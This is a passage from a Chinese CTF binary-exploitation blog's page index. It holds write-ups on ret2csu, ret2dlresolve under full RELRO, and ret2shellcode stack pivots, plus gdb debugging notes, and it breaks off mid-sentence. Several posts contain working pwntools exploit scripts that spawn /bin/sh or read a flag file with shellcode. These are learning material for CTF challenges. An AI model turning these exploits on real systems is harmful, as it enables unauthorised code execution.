class=\"string\">b&#x27;a&#x27;</span> * offset </span><br><span class=\"line\">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payload += p64(csu_front_addr)</span><br><span class=\"line\">    payload += <span class=\"string\">&#x27;a&#x27;</span> * (offset - <span class=\"number\">0x48</span>)</span><br><span class=\"line\">    payload += p64(last)</span><br><span class=\"line\">    p.send(payload)</span><br><span class=\"line\">    sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, write_got, <span class=\"number\">8</span>, write_got, <span class=\"number\">1</span>, main_addr)</span><br><span class=\"line\">write_addr = u64(p.recv(<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">&#x27;write&#x27;</span>, write_addr)</span><br><span class=\"line\">libc_base = write_addr - libc.dump(<span class=\"string\">&#x27;write&#x27;</span>)</span><br><span class=\"line\">execve_addr = libc_base + libc.dump(<span class=\"string\">&#x27;execve&#x27;</span>)</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;execve_addr &#x27;</span> + <span class=\"built_in\">hex</span>(execve_addr))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span></span><br><span class=\"line\"><span class=\"string\">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">log.success(&#x27;system_addr &#x27; + hex(system_addr))</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, read_got, <span class=\"number\">16</span>, bss_base, <span class=\"number\">0</span>, main_addr)</span><br><span class=\"line\">p.send(p64(execve_addr) + <span class=\"string\">&#x27;/bin/sh\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;Hello, World\\n&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">## execve(bss_base+8)</span></span><br><span class=\"line\">csu(<span class=\"number\">0</span>, <span class=\"number\">1</span>, bss_base, <span class=\"number\">0</span>, <span class=\"number\">0</span>, bss_base + <span class=\"number\">8</span>, main_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["STACK - Stack Overflow"]},{"title":"ret2dl_advanced","url":"/2021/08/02/stack_ret2dl_advanced/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-dNeCsBps\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"ret2dl_advanced\">ret2dl_advanced</span></h2><h3><span id=\"1review\">1)review</span></h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p>\n<p>但是我们仍然能够找到某种方式来getshell。</p>\n<p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p>\n<p>(Ps:为什么找不到相关的中文文章)</p>\n<h3><span id=\"2dt_dbg\">2）dt_dbg？</span></h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p>\n<p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p>\n<p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p>\n<p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p>\n<p><code>r_debug</code>具体代码如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable&#x27;s dynamic section has a DT_DEBUG element, the run-time linker sets that element&#x27;s value to the address where this structure can be found. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">r_debug</span></span></span><br><span class=\"line\"><span class=\"class\">  &#123;</span> </span><br><span class=\"line\">    <span class=\"keyword\">int</span> r_version;              <span class=\"comment\">/* Version number for this protocol. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">link_map</span> *<span class=\"title\">r_map</span>;</span>     <span class=\"comment\">/* Head of the chain of loaded objects. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */</span></span><br><span class=\"line\">    ElfW(Addr) r_brk;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">enum</span></span></span><br><span class=\"line\"><span class=\"class\">      &#123;</span> </span><br><span class=\"line\">        <span class=\"comment\">/* This state value describes the mapping change taking place when the `r_brk&#x27; address is called. */</span></span><br><span class=\"line\">        RT_CONSISTENT,          <span class=\"comment\">/* Mapping change is complete. */</span></span><br><span class=\"line\">        RT_ADD,                 <span class=\"comment\">/* Beginning to add a new object. */</span></span><br><span class=\"line\">        RT_DELETE               <span class=\"comment\">/* Beginning to remove an object mapping. */</span></span><br><span class=\"line\">      &#125; r_state;</span><br><span class=\"line\"></span><br><span class=\"line\">    ElfW(Addr) r_ldbase;        <span class=\"comment\">/* Base address the linker is loaded at. */</span></span><br><span class=\"line\">  &#125;;</span><br></pre></td></tr></table></figure>\n<p>实操一遍</p>\n<p>随便写一个无output的栈溢出。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">fur1n@ubuntu:~/pwn$ readelf -d ret2dl</span><br><span class=\"line\"></span><br><span class=\"line\">Dynamic section at offset 0xdb8 contains 27 entries:</span><br><span class=\"line\">  Tag        Type                         Name/Value</span><br><span class=\"line\">...</span><br><span class=\"line\"> 0x0000000000000015 (DEBUG)              0x0</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>在没有运行的时候<code>dt_dbg</code>为空。</p>\n<p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p>\n<p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p>\n<p>段的地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/50gx 0x600e20</span><br><span class=\"line\">...</span><br><span class=\"line\">0x600ee0:\t0x0000000000000015\t0x00007ffff7ffe140</span><br></pre></td></tr></table></figure>\n<p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20gx 0x00007ffff7ffe140</span><br><span class=\"line\">0x7ffff7ffe140 &lt;_r_debug&gt;:\t0x0000000000000001\t0x00007ffff7ffe170</span><br><span class=\"line\">0x7ffff7ffe150 &lt;_r_debug+16&gt;:\t0x00007ffff7de3f40\t0x0000000000000000</span><br><span class=\"line\">0x7ffff7ffe160 &lt;_r_debug+32&gt;:\t0x00007ffff7dd3000\t0x0000000000000000</span><br><span class=\"line\">0x7ffff7ffe170:\t0x0000000000000000\t0x00007ffff7ffe700</span><br><span class=\"line\">0x7ffff7ffe180:\t0x0000000000600e20\t0x00007ffff7ffe710</span><br><span class=\"line\">0x7ffff7ffe190:\t0x0000000000000000\t0x00007ffff7ffe170</span><br><span class=\"line\">0x7ffff7ffe1a0:\t0x0000000000000000\t0x00007ffff7ffe6e8</span><br><span class=\"line\">0x7ffff7ffe1b0:\t0x0000000000000000\t0x0000000000600e20</span><br><span class=\"line\">0x7ffff7ffe1c0:\t0x0000000000600f00\t0x0000000000600ef0</span><br><span class=\"line\">0x7ffff7ffe1d0:\t0x0000000000000000\t0x0000000000600ea0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">0x7ffff7ffe140 &lt;_r_debug&gt;:\t0x0000000000000001\t0x00007ffff7ffe170</span><br></pre></td></tr></table></figure>\n<p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p>\n<p>虽然但是。</p>\n<p>只是找到<code>link_map</code>没啥用。</p>\n<p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p>\n<p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p>\n<p>那么如何寻找呢？</p>\n<p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p>\n<p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p>\n<p><code>dl_runtime_resolve</code>。</p>\n<p>首先我们找到<code>libc.so.6</code>文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/20gx 0x00007ffff7ffe170</span><br><span class=\"line\">0x7ffff7ffe170:\t0x0000000000000000\t0x00007ffff7ffe700</span><br><span class=\"line\">0x7ffff7ffe180:\t0x0000000000600e20\t0x00007ffff7ffe710</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/20gx 0x00007ffff7ffe700</span><br><span class=\"line\">0x7ffff7ffe700:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x7ffff7ffe710:\t0x00007ffff7ffb000\t0x00007ffff7ffebb0</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/s 0x00007ffff7ffebb0</span><br><span class=\"line\">0x7ffff7ffebb0:\t<span class=\"string\">&quot;linux-vdso.so.1&quot;</span></span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x00007ffff7ffe710</span><br><span class=\"line\">0x7ffff7ffe710:\t0x00007ffff7ffb000\t0x00007ffff7ffebb0</span><br><span class=\"line\">0x7ffff7ffe720:\t0x00007ffff7ffb3a0\t0x00007ffff7fe2000</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/10gx 0x00007ffff7fe2000</span><br><span class=\"line\">0x7ffff7fe2000:\t0x00007ffff79e2000\t0x00007ffff7ffedd0</span><br><span class=\"line\">---</span><br><span class=\"line\">pwndbg&gt; x/s 0x00007ffff7ffedd0</span><br><span class=\"line\">0x7ffff7ffedd0:\t<span class=\"string\">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>即<code>0x00007ffff7ffedd0</code>。</p>\n<p>0x3即<code>GOT[]</code>入口</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/30gx 0x00007ffff7dccb80</span><br><span class=\"line\">...</span><br><span class=\"line\">0x7ffff7dccc30:\t0x0000000000000003\t0x00007ffff7dcd000</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>找到GOT[3]</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/5gx 0x00007ffff7dcd000</span><br><span class=\"line\">0x7ffff7dcd000:\t0x00000000003eab80\t0x00007ffff7fe2000</span><br><span class=\"line\">0x7ffff7dcd010:\t0x00007ffff7dea8f0\t0x00007ffff7b70a10</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; xinfo 0x00007ffff7dea8f0</span><br><span class=\"line\">Extended information <span class=\"keyword\">for</span> virtual address 0x7ffff7dea8f0:</span><br><span class=\"line\"></span><br><span class=\"line\">  Containing mapping:</span><br><span class=\"line\">    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so</span><br><span class=\"line\"></span><br><span class=\"line\">  Offset information:</span><br><span class=\"line\">         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0</span><br><span class=\"line\">         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0</span><br><span class=\"line\">      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0</span><br><span class=\"line\">         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0</span><br><span class=\"line\"></span><br><span class=\"line\"> Containing ELF sections:</span><br><span class=\"line\">               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3><span id=\"3exploitation\">3）exploitation</span></h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p>\n<p>有aslr的情况。。</p>\n<p>我也不会。</p>\n<h3><span id=\"4refrence\">4)refrence</span></h3><p><a href=\"http://rk700.github.io/2015/04/09/dt_debug-read/\">通过DT_DEBUG来获得各个库的基址</a></p>\n<p><a href=\"https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico\">How the ELF Ruined Christmas</a></p>\n<p><a href=\"https://ypl.coffee/dl-resolve-full-relro/\">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p>\n<p>————————————————————————tbc———————————————————————————-</p>\n","categories":["Binary_security"],"tags":["STACK - ret2dlresolve"]},{"title":"ret2shellcode","url":"/2022/03/28/stack_ret2shellcode/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-AzKBUQWp\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>          \n<p>一个写shellcode大合集。</p>\n<h2><span id=\"极客大挑战-2019not-bad\">[极客大挑战 2019]Not Bad</span></h2><h3><span id=\"普通的栈迁移\">普通的栈迁移</span></h3><p>​        无保护。可以读入程序的字符长度为0x38，读入shellcode的话空间会不够，需要栈迁移。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-28%20%E4%B8%8B%E5%8D%8810.59.53.png\" alt=\"截屏2022-03-28 下午10.59.53\"></p>\n<p>​        程序为我们开辟了一块fake stack，我们可以直接将ebp劫持至<code>0x123000</code>。</p>\n<p>​        关于栈迁移的部分，其实挺久没有利用到这个trick了，有些不记得了，但是看了相关的文章就又想起来了。这篇写得很详细：<a href=\"https://cloud.tencent.com/developer/article/1601192\">PWN！栈迁移原理</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">32</span> + p64(target_addr) + p64(main_retn)<span class=\"comment\">#pivot the stack to target addr</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​            发送这一段payload以后rbp已经劫持到了0x123000。其实就是在第一次控制程序执行流的时候覆盖rbp为对应的地址，然后在跳转时回到了main函数，但跳过了对栈指针有操作的指令。</p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-29%20%E4%B8%8A%E5%8D%8812.39.34.png\" alt=\"截屏2022-03-29 上午12.39.34\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = asm(shellcraft.amd64.read(<span class=\"number\">0</span>,target_addr+<span class=\"number\">0x300</span>,<span class=\"number\">0x300</span>))<span class=\"comment\">#read shellcode to target addr</span></span><br><span class=\"line\">payload += asm(<span class=\"string\">&quot;mov rax,0x123300;call rax&quot;</span>)<span class=\"comment\">#执行shellcode</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">40</span>,<span class=\"string\">b&#x27;a&#x27;</span>) </span><br><span class=\"line\">payload += p64(target_addr)<span class=\"comment\">#控制程序执行流</span></span><br><span class=\"line\">p.recvline(<span class=\"string\">&quot;Easy shellcode, have fun!&quot;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">shellcode = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>)\t\t</span><br><span class=\"line\">shellcode += shellcraft.read(<span class=\"number\">3</span>, target_addr + <span class=\"number\">0x100</span> , <span class=\"number\">0x50</span>)</span><br><span class=\"line\">shellcode += shellcraft.write(<span class=\"number\">1</span>, target_addr + <span class=\"number\">0x100</span>, <span class=\"number\">0x50</span>)</span><br><span class=\"line\">shellcode = asm(shellcode)</span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>一开始shellcode怎么都生成不了，直到加了这个,挺无语的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2><span id><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-29%20%E4%B8%8A%E5%8D%881.04.24.png\" alt=\"截屏2022-03-29 上午1.04.24\"></span></h2><p>这个题还有另外一个比较逆天的思路。</p>\n<h3><span id=\"逆天的栈迁移\">逆天的栈迁移</span></h3><p>直接利用<code>jmp rsp</code>这个gadget，直接跳转到对应的地方执行，程序输入的buf是在rsp-0x30的地方，所以提前在buf布置好代码，然后利用jmp rsp执行。布置的代码就类似上一个比较常规的思路，套一个target addr 的read，然后读orw的shellcode。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import LibcSearcher</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./bad&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./bad&quot;</span>)</span><br><span class=\"line\">jmp_rsp = <span class=\"number\">0x400a01</span></span><br><span class=\"line\">target_addr = <span class=\"number\">0x123000</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = asm(shellcraft.read(<span class=\"number\">0</span>,target_addr + <span class=\"number\">0x300</span>,<span class=\"number\">0x300</span>))+ asm(<span class=\"string\">&quot;mov rax,0x123000;call rax&quot;</span>)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">40</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload += p64(jmp_rsp) + asm(<span class=\"string\">&quot;sub 0x30,rsp;jmp rsp&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvline(<span class=\"string\">&quot;Easy shellcode, have fun!&quot;</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;/flag&quot;</span>)\t\t</span><br><span class=\"line\">shellcode += shellcraft.read(<span class=\"number\">3</span>, target_addr + <span class=\"number\">0x100</span> , <span class=\"number\">0x20</span>)</span><br><span class=\"line\">shellcode += shellcraft.write(<span class=\"number\">1</span>, target_addr + <span class=\"number\">0x100</span>, <span class=\"number\">0x20</span>)</span><br><span class=\"line\">shellcode = asm(shellcode)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(shellcode)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2><span id=\"mrctf2020_shellcode_revenge\">mrctf2020_shellcode_revenge</span></h2><h4><span id=\"overview\">overview</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.33.15.png\" alt=\"截屏2022-03-19 下午4.33.15\"></p>\n<p>看起来像ret2shellcode。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.36.32.png\" alt=\"截屏2022-03-19 下午4.36.32\"></p>\n<h4><span id=\"逆向\">逆向</span></h4><p>​        不知道为什么ida不能一键f5，不过也懒得修了，程序逻辑也比较简单，就是一个write和read。然后程序会对输入的字符进行ascii码的大小的比较，<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%885.00.43.png\" alt=\"截屏2022-03-19 下午5.00.43\"></p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-19%20%E4%B8%8B%E5%8D%884.52.21.png\" alt=\"截屏2022-03-19 下午4.52.21\"></p>\n<p>​        分析一下这个流程图，我们的目的是执行<code>loc_1236</code>，一共有三个箭头指向它，归纳以后分别是<code>(0x60,0x7A)</code>,<code>(0x2f,0x5A)</code>,ascii在这些范围内的字符会被读入buf，然后<code>call rax</code>，也就是执行了我们输入的shellcode。</p>\n<h4><span id=\"利用\">利用</span></h4><p>​        由于题目本身的设置，我们并不需要像常规那样先泄露什么栈上的地址，只需要绕过题目的检测。虽然但是，搞不懂这个字符ackii码的限制意义何在。去摸了一下ackii表，发现这个范围内的字符都是数字或者字母。</p>\n<p>​        所以把shellcode转换成这些范围内的字符，然后直接传输就行。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["STACK - ret2shellcode"]},{"title":"gdb附加调试的一些黑魔法","url":"/2021/10/27/sum_gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-wAjwVoDT\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"1abstract\">1）abstract</span></h2><p>​    这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。</p>\n<h2><span id=\"2格式化字符串-cctf-pwn3\">2）格式化字符串-cctf-pwn3</span></h2><h3><span id=\"1pausep导致error-could-not-find-elf-base\">1）pause（p）导致ERROR: Could not find ELF base</span></h3><h5><span id=\"问题\">问题</span></h5><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837</span><br><span class=\"line\">Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\"><span class=\"keyword\">done</span>.</span><br><span class=\"line\">Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.</span><br><span class=\"line\"><span class=\"keyword\">done</span>.</span><br><span class=\"line\">Cannot access memory at address 0xf7fad924</span><br><span class=\"line\"></span><br><span class=\"line\">warning: Unable to find dynamic linker breakpoint <span class=\"keyword\">function</span>.</span><br><span class=\"line\">GDB will be unable to debug shared library initializers</span><br><span class=\"line\">and track explicitly loaded dynamic code.</span><br><span class=\"line\">Failed to <span class=\"built_in\">read</span> a valid object file image from memory.</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">0xf7f85b59 <span class=\"keyword\">in</span> ?? ()</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\">ERROR: Could not find ELF base!</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png\" alt=\"截屏2021-10-27 上午11.17.59\"></p>\n<p>​    首先需要知道这个报错的原因。</p>\n<p>​    虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>\n<p>​    那么进程中止的原因何在？</p>\n<h5><span id=\"解决方案\">解决方案</span></h5><p>​     经过大师指点，这个问题其实是因为exp错误（</p>\n<p>​    这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是<code>elf base not found</code>。    </p>\n<h5><span id=\"总结\">总结</span></h5><p>​    如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。</p>\n<h2><span id=\"3__kernel_vsyscall\">3）__kernel_vsyscall？</span></h2><h5><span id=\"问题\">问题</span></h5><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>\n<p>​    我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么<code>__kernel_vsyscall</code>是一个怎样的函数，为什么偏偏就断在它的身上呢？ </p>\n<h5><span id=\"解决\">解决</span></h5><p>​    在stackoverflow上，我们能够看出一些端倪。</p>\n<blockquote>\n<p>​    <code>__kernel_vsyscal</code> is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the <code>sysenter</code> instruction. </p>\n</blockquote>\n<p>​    这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>\n<p>​    所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。我们同时可以注意到，当  <code>__kernel_vsyscal</code> 函数执行完成，下一个函数则是<code>read</code>函数，也符合我们程序的逻辑—一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。</p>\n<p>当然要结束这个函数我们只需要gdb finish。</p>\n<p>或者直接使用gdb.attach(sh,”break xxx”)。</p>\n<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>\n<h2><span id=\"4gdb附加调试下断点的几种姿势\">4）gdb附加调试下断点的几种姿势。</span></h2><h5><span id=\"1gdbattachp\">1）gdb.attach(p)</span></h5><h5><span id=\"2gdbattachpbreak\">2）gdb.attach(p,”break \\<func 